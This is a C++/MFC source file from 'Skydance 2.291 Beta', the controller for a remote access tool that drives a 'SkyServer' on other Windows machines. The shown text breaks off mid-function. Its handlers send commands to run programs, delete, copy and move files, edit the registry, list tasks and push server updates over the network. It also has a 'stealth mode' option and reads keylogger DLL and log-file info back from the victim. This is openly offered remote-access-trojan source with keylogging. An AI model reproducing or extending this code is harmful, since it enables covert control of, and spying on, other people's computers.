/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// SkydanceDoc.cpp : Implementierung der Klasse CSkydanceDoc
//

#include "stdafx.h"
#include "Skydance.h"
#include "io.h" //listfile dir

#include "SkydanceDoc.h"
#include "LeftView.h"
#include "SkydanceView.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSkydanceDoc

IMPLEMENT_DYNCREATE(CSkydanceDoc, CDocument)

BEGIN_MESSAGE_MAP(CSkydanceDoc, CDocument)
	ON_UPDATE_COMMAND_UI(ID_INDICATOR_STAT1, OnUpdateIndicatorStat1)
	ON_UPDATE_COMMAND_UI(ID_INDICATOR_STAT2, OnUpdateIndicatorStat2)
	//{{AFX_MSG_MAP(CSkydanceDoc)
	ON_COMMAND(ID_BTCONNECT, OnBtconnect)
	ON_UPDATE_COMMAND_UI(ID_STEALTH_MODE, OnUpdateStealthMode)
	ON_UPDATE_COMMAND_UI(ID_UPDATE_MODE, OnUpdateUpdateMode)
	ON_UPDATE_COMMAND_UI(ID_DISCOVERY_MODE, OnUpdateDiscoveryMode)
	ON_UPDATE_COMMAND_UI(ID_FOLDER, OnUpdateFolder)
	ON_UPDATE_COMMAND_UI(ID_FOLDERFILE, OnUpdateFolderfile)
	ON_COMMAND(ID_DISCOVERY_MODE, OnDiscoveryMode)
	ON_COMMAND(ID_FOLDER, OnFolder)
	ON_COMMAND(ID_FOLDERFILE, OnFolderfile)
	ON_COMMAND(ID_UPDATE_MODE, OnUpdateMode)
	ON_COMMAND(ID_STEALTH_MODE, OnStealthMode)
	ON_UPDATE_COMMAND_UI(ID_BTCONNECT, OnUpdateBtconnect)
	ON_COMMAND(ID_BTREGEDIT, OnBtregedit)
	ON_UPDATE_COMMAND_UI(ID_BTREGEDIT, OnUpdateBtregedit)
	ON_COMMAND(ID_BTMSG, OnBtmsg)
	ON_COMMAND(ID_BTSPECIAL, OnBtspecial)
	ON_UPDATE_COMMAND_UI(ID_BTCOPY, OnUpdateBtcopy)
	ON_UPDATE_COMMAND_UI(ID_BTDELETE, OnUpdateBtdelete)
	ON_UPDATE_COMMAND_UI(ID_BTFTP, OnUpdateBtftp)
	ON_UPDATE_COMMAND_UI(ID_BTMSG, OnUpdateBtmsg)
	ON_UPDATE_COMMAND_UI(ID_BTRUN, OnUpdateBtrun)
	ON_UPDATE_COMMAND_UI(ID_BTSPECIAL, OnUpdateBtspecial)
	ON_COMMAND(ID_BTDISCONNECT, OnBtdisconnect)
	ON_UPDATE_COMMAND_UI(ID_BTDISCONNECT, OnUpdateBtdisconnect)
	ON_COMMAND(ID_BTTASKS, OnBttasks)
	ON_UPDATE_COMMAND_UI(ID_BTTASKS, OnUpdateBttasks)
	ON_UPDATE_COMMAND_UI(ID_BTMOVE, OnUpdateBtmove)
	ON_UPDATE_COMMAND_UI(ID_BTNEWFOLDER, OnUpdateBtnewfolder)
	ON_COMMAND(ID_BTCOPY, OnBtcopy)
	ON_COMMAND(ID_BTDELETE, OnBtdelete)
	ON_COMMAND(ID_BTFTP, OnBtftp)
	ON_COMMAND(ID_BTRUN, OnBtrun)
	ON_COMMAND(ID_BTMOVE, OnBtmove)
	ON_COMMAND(ID_BTNEWFOLDER, OnBtnewfolder)
	ON_COMMAND(ID_BTUPDATE, OnBtupdate)
	ON_UPDATE_COMMAND_UI(ID_BTUPDATE, OnUpdateBtupdate)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSkydanceDoc Konstruktion/Destruktion

CSkydanceDoc::CSkydanceDoc()
{
	// ZU ERLEDIGEN: Hier Code für One-Time-Konstruktion einfügen
	int i = 1;
	while(i <= 79) 
	{
		m_bFreeSocket[i] = TRUE;
		i++;
	}
	m_iNumberOfFolders = -1;
	m_iNumberOfFiles = -1;
	m_iNumberOfTasks = -1;
	m_iHDcounter = 2;	//1 ist für den hauptbaum! OnInitilaUpdate
	m_sStat1 = "Ready to Connect";//NZE
	m_sStat2 = "No Data Received";//NZE
	m_iNavigateMode = 3;
	m_bFolderFile = TRUE;
	m_iConnected = 0;
	m_cSkySocket = new CSkySocket(0);//socket als objekt laden
	m_bFreeSocket[0] = FALSE;//socket "sperren"!
	//m_sActiveIP = "127.0.0.1";
	m_sActiveIP = "Disconnected";
	m_iNextFtpStatNr = 1;
	m_iFolderFileTask = 0;
	m_sCopyPathOfFile = "";
	m_bDlgSpecialExists = FALSE;
	m_bDlgTasksExists = FALSE;
	m_bDlgRegExists = FALSE;
	m_pLeftRecView = NULL;
	m_bServerUpdate = FALSE;
}

CSkydanceDoc::~CSkydanceDoc()
{
}

CSkydanceDoc * CSkydanceDoc::GetDoc()
{
	CFrameWnd * pFrame = (CFrameWnd *)(AfxGetApp()->m_pMainWnd);
	return (CSkydanceDoc *) pFrame->GetActiveDocument();
}


BOOL CSkydanceDoc::OnNewDocument()
{
	if (!CDocument::OnNewDocument())
		return FALSE;

	//AfxGetMainWnd()->PostMessage(WM_CLOSE, 0, 0);
	// ZU ERLEDIGEN: Hier Code zur Reinitialisierung einfügen
	// (SDI-Dokumente verwenden dieses Dokument)
	SetTitle("Disconnected");
	return TRUE;
}



/////////////////////////////////////////////////////////////////////////////
// CSkydanceDoc Serialisierung

void CSkydanceDoc::Serialize(CArchive& ar)
{
	if (ar.IsStoring())
	{
		// ZU ERLEDIGEN: Hier Code zum Speichern einfügen
	}
	else
	{
		// ZU ERLEDIGEN: Hier Code zum Laden einfügen
	}
}

/////////////////////////////////////////////////////////////////////////////
// CSkydanceDoc Diagnose

#ifdef _DEBUG
void CSkydanceDoc::AssertValid() const
{
	CDocument::AssertValid();
}

void CSkydanceDoc::Dump(CDumpContext& dc) const
{
	CDocument::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSkydanceDoc Befehle - Statusbar

void CSkydanceDoc::OnUpdateIndicatorStat1(CCmdUI *pCmdUI)
{
pCmdUI->Enable(TRUE);
	for (int i = 1; i < 41; i++)
	{
		if (m_bFreeSocket[i] == FALSE)
				((CDlgFtpStatus*)m_cDlgFtpStatus[i])->UpdateStat();
	}
	if(m_iConnected == 1)
	{
		SetTitle(m_sActiveIP);
	}
	else 
	{
		SetTitle("Disconnected");
	}
pCmdUI->SetText(m_sStat1);
}

void CSkydanceDoc::OnUpdateIndicatorStat2(CCmdUI *pCmdUI)
{
pCmdUI->Enable(TRUE);
pCmdUI->SetText(m_sStat2);
}

//////////////////////////////////////////////////////
////////////////////////////Menu
void CSkydanceDoc::OnStealthMode() 
{
	// TODO: Code für Befehlsbehandlungsroutine hier einfügen
	m_iNavigateMode = 1;
}

void CSkydanceDoc::OnUpdateStealthMode(CCmdUI* pCmdUI) 
{
	// TODO: Code für die Befehlsbehandlungsroutine zum Aktualisieren der Benutzeroberfläche hier einfügen
	pCmdUI ->SetCheck(m_iNavigateMode == 1 ? 1 : 0);
}

void CSkydanceDoc::OnUpdateMode() 
{
	// TODO: Code für Befehlsbehandlungsroutine hier einfügen
	m_iNavigateMode = 2;	
}

void CSkydanceDoc::OnUpdateUpdateMode(CCmdUI* pCmdUI) 
{
	// TODO: Code für die Befehlsbehandlungsroutine zum Aktualisieren der Benutzeroberfläche hier einfügen
	pCmdUI ->SetCheck(m_iNavigateMode == 2 ? 1 : 0);
}

void CSkydanceDoc::OnDiscoveryMode() 
{
	// TODO: Code für Befehlsbehandlungsroutine hier einfügen
	m_iNavigateMode = 3;
}

void CSkydanceDoc::OnUpdateDiscoveryMode(CCmdUI* pCmdUI) 
{
	// TODO: Code für die Befehlsbehandlungsroutine zum Aktualisieren der Benutzeroberfläche hier einfügen
	pCmdUI ->SetCheck(m_iNavigateMode == 3 ? 1 : 0);
}

void CSkydanceDoc::OnFolderfile() 
{
	// TODO: Code für Befehlsbehandlungsroutine hier einfügen
	m_bFolderFile = TRUE;
}

void CSkydanceDoc::OnUpdateFolderfile(CCmdUI* pCmdUI) 
{
	// TODO: Code für die Befehlsbehandlungsroutine zum Aktualisieren der Benutzeroberfläche hier einfügen
	pCmdUI ->SetCheck(m_bFolderFile == TRUE ? 1 : 0);
}

void CSkydanceDoc::OnFolder() 
{
	// TODO: Code für Befehlsbehandlungsroutine hier einfügen
	m_bFolderFile = FALSE;
}

void CSkydanceDoc::OnUpdateFolder(CCmdUI* pCmdUI) 
{
	// TODO: Code für die Befehlsbehandlungsroutine zum Aktualisieren der Benutzeroberfläche hier einfügen
	pCmdUI ->SetCheck(m_bFolderFile == FALSE ? 1 : 0);
}
/////////////////////////////////Menu
///////////////////////////////////////////////////////////////
/////////////////////////////////ToolBar
void CSkydanceDoc::OnUpdateBtconnect(CCmdUI* pCmdUI) 
{
//	if(m_iConnected == 0) pCmdUI->Enable(FALSE);//netürlich immer an!
//	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtdisconnect(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);	
}

void CSkydanceDoc::OnUpdateBtregedit(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtcopy(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtdelete(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtftp(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtmsg(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtrun(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtspecial(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBttasks(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);
}

void CSkydanceDoc::OnUpdateBtmove(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);	
}


void CSkydanceDoc::OnUpdateBtnewfolder(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);	
}

void CSkydanceDoc::OnUpdateBtupdate(CCmdUI* pCmdUI) 
{
	if(m_iConnected == 0) pCmdUI->Enable(FALSE);
	else pCmdUI->Enable(TRUE);	
}
/////////////////////////////////ToolBar
///////////////////////////////////////////////////////////
/////////////////////////////////Main Code


void CSkydanceDoc::OnBtconnect() 
{
	m_sActiveIP = "127.0.0.1";
	if (m_cDlgConnect.DoModal () == IDOK)
	{
		m_cSkySocket->Close();
		m_iConnected = 0;
		//m_sStat1 = "Connecting to " + m_cDlgConnect.m_sIP;
		m_sActiveIP = m_cDlgConnect.m_sIP;
		m_cSkySocket->Create();
		if ((m_cSkySocket->Connect(m_sActiveIP, m_cDlgConnect.m_iPort)) == 0 )
		{	m_sStat1 = "Connecting to " + m_cDlgConnect.m_sIP + " failed";
			m_pLeftRecView->AddEvent(m_sStat1, 1);
		}
		else
		{
			m_sStat1 = "Connected to " + m_cDlgConnect.m_sIP;
			m_pLeftRecView->AddEvent(m_sStat1, 1);
			m_iConnected = 1;
			m_cDlgSpecial.m_iPort = m_cDlgConnect.m_iPort;	//Für DlgSpecial
			m_cDlgSpecial.m_sPass = m_cDlgConnect.m_sPass;	//
			m_cDlgSpecial.m_sPassReenter = m_cDlgConnect.m_sPass;
			SendPack("Pass<" + m_cDlgConnect.m_sPass + "</");
			if (m_cDlgConnect.m_bUpEnvir == TRUE)
			{
				m_iHDcounter = 2;
				CleanAllViews();///neue Environment...
				//	m_cSkySocket->Send("SendEnvironmentData</", 21);
				//	if (m_cDlgConnect.m_iPassword == TRUE) SendPack(m_cDlgConnect.m_sPass + "</");
			//	else SendPack("Skydance</");
				
				SendPack("SendEnvironmentData</");
			}
		}
	}
}

void CSkydanceDoc::OnBtdisconnect() 
{
	m_cSkySocket->Close();
	m_iConnected = 0;
	m_sStat1 = "Disconnected";
	m_pLeftRecView->AddEvent(m_sStat1, 1);
}

void CSkydanceDoc::OnBtcopy() 
{
	if (m_cDlgCopy.DoModal () == IDOK)
	{
		if(m_cDlgCopy.m_sSource != "" && m_cDlgCopy.m_sTarget != "")
		{
			SendPack("copy<" + m_cDlgCopy.m_sSource + '<' + m_cDlgCopy.m_sTarget + "</");
			m_sStat2 = "Sending Copy-Command";
			m_pLeftRecView->AddEvent("Copy: " + m_cDlgCopy.m_sSource + " -> " + m_cDlgCopy.m_sTarget, 3);
		}
		else AfxMessageBox("Enter File-Names!");
	}
}

void CSkydanceDoc::OnBtdelete()
{
	if (m_cDlgDelete.DoModal () == IDOK)
	{
		if(m_cDlgDelete.m_sDeleteName != "")
		{
			SendPack("DELETE<" + m_cDlgDelete.m_sDeleteName + "</");
			m_sStat2 = "Sending Delete-Command";
			m_pLeftRecView->AddEvent("Delete: " +m_cDlgDelete.m_sDeleteName , 3);
		}
		else AfxMessageBox("Enter a name!");
	}
}

void CSkydanceDoc::OnBtftp() //m_bServerUpdate-->handelt es sich um ein server update? TRUE = ja -> nicht vergessen, wieder danach auf nein zu setzten
{
	//CDlgFtp *cDlgFtp = new CDlgFtp;
	m_iNextFtpStatNr = 1;
	while(m_bFreeSocket[m_iNextFtpStatNr] == FALSE) m_iNextFtpStatNr++;//Nr freimachen
	if (m_iNextFtpStatNr >40)
	{
		AfxMessageBox("Error, too many Downloads!");
		m_bServerUpdate = FALSE;
		return;
	}
	m_cDlgFtp.m_iFtpPort = 6049 + m_iNextFtpStatNr;
	char sNextFtpStatNr[4];
	itoa(m_iNextFtpStatNr,sNextFtpStatNr,10);
	
	if (m_cDlgFtp.DoModal () == IDOK)
	{
	///////first Create a new Connection
		if (m_cDlgFtp.m_sFileNameS != "" && m_cDlgFtp.m_sFileNameC != "") 
		{
			struct _finddatai64_t c_file;	//prüfen, ob die datei auf dem client rechner schon existiert
			long lFile;	
			if(m_cDlgFtp.m_bUpDown == FALSE)
			{	
				if( (lFile = _findfirsti64( m_cDlgFtp.m_sFileNameC , &c_file )) != -1L )
				{
					m_pLeftRecView->AddEvent("Client: FTP aborted, file allready exists: " + 
																		m_cDlgFtp.m_sFileNameC, 3);
					m_bServerUpdate = FALSE;
					return;	//wenn ja, dann abbruch...
				}
			}
			//bool b = FALSE;			//
			bool option = TRUE;		//welche Richtung Verbindungsaufbau?
			CString sUpDown = "unknown";
			m_bFreeSocket[m_iNextFtpStatNr] = FALSE;//und den gewählten ftp-socket Arraybereich sperren...
			if (m_cDlgFtp.m_iDirection == FALSE) //jaja, ist umständlich...
			{
				option = TRUE;
			}
			if (m_cDlgFtp.m_iDirection == TRUE)
			{
				option = FALSE;
			}
			if (m_cDlgFtp.m_bUpDown == TRUE) sUpDown = "upload";	//welche richtung transfer?
			if (m_cDlgFtp.m_bUpDown == FALSE) sUpDown = "download";
			char ftpPort[20];//convertiert int in char!
			itoa(m_cDlgFtp.m_iFtpPort, ftpPort, 10);
			if (option == TRUE) 
			{
				//handelt es sich um ein server update?
				if(m_bServerUpdate) CreateFtpSession(m_iNextFtpStatNr, m_cDlgFtp.m_iFtpPort, option/*TRUE*/ ,
										m_cDlgFtp.m_bUpDown, m_cDlgFtp.m_sFileNameC, m_cDlgFtp.m_sFileNameS, TRUE);
				else CreateFtpSession(m_iNextFtpStatNr, m_cDlgFtp.m_iFtpPort, option/*TRUE*/, m_cDlgFtp.m_bUpDown, 
								m_cDlgFtp.m_sFileNameC, m_cDlgFtp.m_sFileNameS);					//flase=down
				SendPack("ftp<ConToMe<" + m_cDlgFtp.m_sFileNameS + "<"+ ftpPort + "<" + sUpDown + "<" 
										+ sNextFtpStatNr + "</");
			}
			else
			{ 
				//handelt es sich um ein server update?
				SendPack("ftp<WaitForCon<" + m_cDlgFtp.m_sFileNameS + "<" + ftpPort + "<" + sUpDown + "<"
											+ sNextFtpStatNr + "</");
				if(m_bServerUpdate) CreateFtpSession(m_iNextFtpStatNr, m_cDlgFtp.m_iFtpPort, option/*FLASE*/ , 
										m_cDlgFtp.m_bUpDown, m_cDlgFtp.m_sFileNameC, m_cDlgFtp.m_sFileNameS, TRUE);
				else CreateFtpSession(m_iNextFtpStatNr, m_cDlgFtp.m_iFtpPort, option/*FLASE*/, m_cDlgFtp.m_bUpDown, 
							m_cDlgFtp.m_sFileNameC, m_cDlgFtp.m_sFileNameS);

			}
		}
		else AfxMessageBox("Please enter a File-Name !");
	}
	m_cDlgFtp.m_bUpDown = TRUE;
	m_cDlgFtp.m_iDirection = FALSE;
	m_cDlgFtp.m_sFileNameC = "";
	m_cDlgFtp.m_sFileNameS = "";
	m_bServerUpdate = FALSE;
}

void CSkydanceDoc::OnBtmsg() 
{
	if (m_cDlgMessageBox.DoModal () == IDOK)
	{
	CString option = '1'; 
	if (m_cDlgMessageBox.m_iMsgOption == 0) option = '1';
	if (m_cDlgMessageBox.m_iMsgOption == 1) option = '2';
	if (m_cDlgMessageBox.m_iMsgOption == 2) option = '3';
	if (m_cDlgMessageBox.m_iMsgOption == 3) option = '4';
	SendPack("msg<" + option + '<' + m_cDlgMessageBox.m_sMsgText + '<' + m_cDlgMessageBox.m_sMsgTitle + "</");
	m_sStat2 = "Sending Msg...";
	m_pLeftRecView->AddEvent(m_sStat2, 3);
	}
}

void CSkydanceDoc::OnBtrun() 
{
	if (m_cDlgRun.DoModal () == IDOK)
	{
	SendPack("run<" + m_cDlgRun.m_sRunCommand + "</");
	m_sStat2 = "Sending Command...";
	m_pLeftRecView->AddEvent("Command: " + m_cDlgRun.m_sRunCommand , 3);
	}
}

void CSkydanceDoc::OnBtspecial() 
{
	if(m_bDlgSpecialExists == TRUE) 
	{
		m_cDlgSpecial.DestroyWindow();		//!!! vorherunbedingt ein vorhandenes fenster löschen!
	}
	m_cDlgSpecial.m_bSettings = FALSE;
	m_cDlgSpecial.Create(IDD_DLGSPECIAL, NULL);
	m_cDlgSpecial.ShowWindow(SW_SHOW); //wie geht NA???	
	m_bDlgSpecialExists = TRUE;
}

void CSkydanceDoc::OnBtregedit() 
{
	if(m_bDlgRegExists == TRUE) 
	{
		m_cDlgReg.DestroyWindow();		//!!! vorherunbedingt ein vorhandenes fenster löschen!
	}
	m_cDlgReg.Create(IDD_DLGREG, NULL);
	m_cDlgReg.ShowWindow(SW_SHOW); //wie geht NA???	
	m_bDlgRegExists = TRUE;
}

void CSkydanceDoc::OnBttasks() 
{
//	if (m_cDlgTasks.DoModal () == IDOK)
//	{}
	if(m_bDlgTasksExists == TRUE) 
	{
		m_cDlgTasks.DestroyWindow();		//!!! vorherunbedingt ein vorhandenes fenster löschen!
	}
	//m_cDlgSpecial.m_bSettings = FALSE;
	m_cDlgTasks.Create(IDD_DLGTASKS, NULL);
	m_cDlgTasks.ShowWindow(SW_SHOW); //wie geht NA???	
	m_bDlgTasksExists = TRUE;
}

void CSkydanceDoc::OnBtmove() 
{
	if (m_cDlgMove.DoModal () == IDOK)
	{
		if(m_cDlgMove.m_sSource != "" && m_cDlgMove.m_sTarget != "")
		{
			SendPack("move<" + m_cDlgMove.m_sSource + '<' + m_cDlgMove.m_sTarget + "</");
			m_sStat2 = "Sending Move-Command";
			m_pLeftRecView->AddEvent("Move: " + m_cDlgMove.m_sSource + " -> " + m_cDlgMove.m_sTarget, 3);
		}
		else AfxMessageBox("Enter File-Names!");
	}
}

void CSkydanceDoc::OnBtnewfolder() 
{
	m_cDlgNewFolder.m_sFolderName = m_pLeftView->m_sActivePath;
	if (m_cDlgNewFolder.DoModal () == IDOK)
	{
		if(m_cDlgNewFolder.m_sFolderName != "")
		{
			SendPack("CreateNewFolder<" + m_cDlgNewFolder.m_sFolderName + "</");
			m_sStat2 = "Trying to Create...";
			m_pLeftRecView->AddEvent("Create: " + m_cDlgNewFolder.m_sFolderName, 3);
		}
		else AfxMessageBox("Enter Folder-Name!");
	}
}

void CSkydanceDoc::OnBtupdate() 
{
//	if(m_cDlgSpecial.m_sFileName == "") 
//	{ 
//		MessageBox( NULL,"Update not possible.\nSorry, this function is only supported by SkyServer-Versions >= 2.29!" ) to a new version.\nContinue?",
//										"Update Server", MB_OK);
//		return;
//	}
	if(MessageBox( NULL,"This function will update SkyServer (at " + m_cDlgConnect.m_sIP + " ) to a new version (minimun 2.29!).\nContinue?",
										"Update Server", MB_YESNO) != IDYES) return;
	if(MessageBox( NULL,"The Update will take 3 steps:\n1. Upload a new temporary SkyServer-file\n2. modify registry\n3. restart Server-Computer and delete temporary SkyServer-file\n\nContinue with step 1?",
										"Update Server", MB_YESNO) != IDYES) return;
	
	//stufe 1
	MessageBox( NULL,"Select the SkyServer you want to upload and choose the temporary SkyServer-file-name on the Server-Computer.",
										"Update Server: Step 1", MB_OK);
	
	m_cDlgFtp.m_sFileNameS = "c:\\";	//temporary file
	m_cDlgFtp.m_bUpDown = TRUE;	//UPLOAD
	m_cDlgFtp.m_iDirection = FALSE;
	m_bServerUpdate = TRUE;		//OnBtftp mitteilen, dass es sich um eine Updatde handelt...
	OnBtftp();
	//ende stufe 1
}

///////////////////////////////////////////////////
////////////////////Events
//DEL void CSkydanceDoc::OnConnect()
//DEL {
//DEL 	m_sStat1 = "Connected to " + m_cDlgConnect.m_sIP;
//DEL 	m_iConnected = 1;
//DEL }

void CSkydanceDoc::OnClose()
{
	m_sStat1 = "Disconnected";
	m_pLeftRecView->AddEvent(m_sStat1, 1);
	m_iConnected = 0;
}

void CSkydanceDoc::OnSend()
{

}

void CSkydanceDoc::OnReceive()
{
TCHAR buff[4096];
	CString strToAnalyse;
	int nRead;
	int strLeng;
	int nextBreak = 0;
	nRead = m_cSkySocket->Receive(buff, 4096); 
	if (nRead != SOCKET_ERROR)
	{
		if (nRead)
		{
			buff[nRead] = 0; 
			CString strRecvd(buff);
			while(nextBreak != -1)
			{
				strLeng = strRecvd.GetLength();
				nextBreak = strRecvd.Find("/");
				if (nextBreak != -1)
				{				
					strToAnalyse = strRecvd.Left(nextBreak);
					strRecvd = strRecvd.Right(strLeng - nextBreak -  1); //-7
					if(strToAnalyse != "")
					{
						AnalyseString(strToAnalyse);
						if(strToAnalyse  != '*')
						{
							m_sStat2 = strToAnalyse;
						}
					}
				}
			}
		}
		else
		{
			m_cSkySocket->Close();
			AfxMessageBox("Error in Receive-Buffer, Connection terminated");
		}
	}
	else
	{
		wsprintf (buff, "Error number is %d", GetLastError());
	}
}
///////////////////////////Events
//////////////////////////////////////////
///////////////////////////Some Code...

void CSkydanceDoc::SendPack(CString Pack)
{
	//AfxMessageBox(buff);
	TCHAR buff[10240];					/////buffer 
	int nFill = 100;							
	nFill = Pack.GetLength();			
	strcpy( buff, Pack);				/////mit string füllen
	buff[nFill] = 0;					/////"letzten" charauf null(nur zur vorsicht)
	//AfxMessageBox(buff);				//nur zur Entwicklung!
	m_cSkySocket->Send(buff, nFill);	/////und weg damit!
}

void CSkydanceDoc::CreateFtpSession(int nextFtpStatNr, int ftpPort, bool scWay, bool UpDown,
									CString sFileNameC, CString sFileNameS,
									BOOL bServerUpdate)
{
	//if(bServerUpdate) AfxMessageBox("Update");
	//else AfxMessageBox("no Update");
	//delete m_cDlgFtpStatus[nextFtpStatNr]; geht so nicht... muss ich irgendwie anders machen.
	m_cDlgFtpStatus[nextFtpStatNr] = new CDlgFtpStatus(nextFtpStatNr, scWay,
												ftpPort, m_sActiveIP, UpDown, sFileNameC, sFileNameS);
	/////und statusdialog auf!, die ganzen Werte übergeben...
	if(UpDown == TRUE)//Goal aktualisieren, nur bei upload
	{
		HANDLE hFile;
		hFile = CreateFile (TEXT(sFileNameC),       // Open One.txt.
		                GENERIC_READ,           // Open for reading
						0,                      // Do not share
			            NULL,                   // No security
				        OPEN_EXISTING,          // Existing file only
					    FILE_ATTRIBUTE_NORMAL,  // Normal file
						NULL);                  // No template file
		int iFileSize = GetFileSize(hFile, NULL);
		
		if (iFileSize == -1) m_cDlgFtpStatus[nextFtpStatNr]->m_sGoal = "Error";
		else
		{
			char sFileSize[20];
			itoa(iFileSize, sFileSize, 10);
			m_cDlgFtpStatus[nextFtpStatNr]->m_sGoal = sFileSize;
		}
		CloseHandle (hFile);
	}
	////////////////////////
		if(UpDown == FALSE)
		{	
			m_cDlgFtpStatus[nextFtpStatNr]->m_sDirection = "Download";//Upload/downolad?
		}
		else m_cDlgFtpStatus[nextFtpStatNr]->m_sDirection = "Upload";
		m_cDlgFtpStatus[nextFtpStatNr]->m_sFileName = sFileNameC;
//		m_cDlgFtpStatus[nextFtpStatNr]->m_sFileNameServer = sFileNameS;
	
	if(bServerUpdate) m_cDlgFtpStatus[nextFtpStatNr]->m_bServerUpdate = TRUE;	//handelt es sich um einen Server update?
	else m_cDlgFtpStatus[nextFtpStatNr]->m_bServerUpdate = FALSE;
	m_cDlgFtpStatus[nextFtpStatNr]->Create(IDD_DLGFTPSTATUS, NULL);
	m_cDlgFtpStatus[nextFtpStatNr]->ShowWindow(SW_SHOW); //wie geht NA???
}

void CSkydanceDoc::AnalyseString(CString strToAnalyse) ///add Folders usw...
{
	int strLeng = strToAnalyse.GetLength();
	int nextBreak = 0;
	int i=0;
//	int currentItem;
	CString ComIndex = strToAnalyse.Left(1);
	CString part[10];
	if( ComIndex == '*' || 	ComIndex == '<' || ComIndex == '>')
	{
		if (ComIndex == '>') 
		{
			m_iNumberOfFolders = -1;//// wegen treeview '-1'... neuer loop "counter" um tree einzutragen
			m_iNumberOfFiles = -1;
			m_iNumberOfTasks = -1;
			if ( strToAnalyse.Right(strLeng - 1) == "NewDir" ) 
			{
				m_iFolderFileTask = 1;//Folder
			}			
			if ( strToAnalyse.Right(strLeng - 1) == "NewFile" )
			{
				m_iFolderFileTask = 2;//File
			}
			if ( strToAnalyse.Right(strLeng - 1) == "NewTask" )
			{
				m_cDlgTasks.m_ctrlListTasks.ResetContent();
				m_iFolderFileTask = 3;//File

			}
		}
		if (ComIndex == '<')
		{
			if ( m_iFolderFileTask == 1)
			{
				++m_iNumberOfFolders;//counter zählen lassen...
				m_aData[m_iNumberOfFolders] = strToAnalyse.Right(strLeng - 1);
			}
			if ( m_iFolderFileTask == 2)
			{
				++m_iNumberOfFiles;
				m_aData[m_iNumberOfFiles] = strToAnalyse.Right(strLeng - 1);
			}
			if ( m_iFolderFileTask == 3)
			{
				++m_iNumberOfTasks;
				m_cDlgTasks.m_ctrlListTasks.AddString(strToAnalyse.Right(strLeng - 1));
				//currentItem = m_cDlgTasks.m_ctrlListTasks.GetCount();
				//if(currentItem != LB_ERR)
				{
					//if( currentItem == 1) AfxMessageBox("Bla!");
					//m_cDlgTasks.m_ctrlListTasks.SetItemData(currentItem, m_iNumberOfTasks);
					m_cDlgTasks.m_ctrlListTasks.SetItemData(m_iNumberOfTasks, m_iNumberOfTasks);
				}
				//m_cDlgTasks.UpdateData(TRUE);
				//m_aData[m_iNumberOfTasks] = strToAnalyse.Right(strLeng - 1);
			}
		}
		if (ComIndex == '*') 
		{
			UpdateAllViews(NULL);		//nur zur Entwicklung(nene,ist schon wichtig!)
			m_iFolderFileTask = 0;		//und die arrays sperren, kein weiters stzen durch "<"!
			m_iNumberOfFolders = -1;	//vorsichtshalber zurücksetzen!
			m_iNumberOfFiles = -1;
			m_iNumberOfTasks = -1;
		}
		return;
	}
	else
	{
		while(nextBreak != -1)
		{
			strLeng = strToAnalyse.GetLength();
			nextBreak = strToAnalyse.Find("<");
			if (nextBreak != -1)
			{				
				part[i] = strToAnalyse.Left(nextBreak);
				strToAnalyse = strToAnalyse.Right(strLeng - nextBreak -  1); //-7
				//AfxMessageBox(part[i]);
				i++;
			}
		}
		if(part[0] == "AddHD")
		{
			m_pLeftView-> AddEnvironmentData(part[1],part[2], m_iHDcounter);
			m_iHDcounter++;
			return;
		}
		if(part[0] == "FileSize")
		{
			int iFtpStatNr;
			sscanf (part[1], "%d", &iFtpStatNr);
			m_cDlgFtpStatus[iFtpStatNr]->m_sGoal = part[2];
			m_cDlgFtpStatus[iFtpStatNr]->UpdateData(FALSE);
			return;
		}
		if(part[0] == "KeyLogInfo")
		{
			m_cDlgSpecial.m_sDLLFile = part[1];
			m_pLeftRecView->AddEvent("DllFile is: " + part[1], 3);
			m_cDlgSpecial.m_sLogFile = part[2];
			m_pLeftRecView->AddEvent("LogFile is: " + part[2], 3);
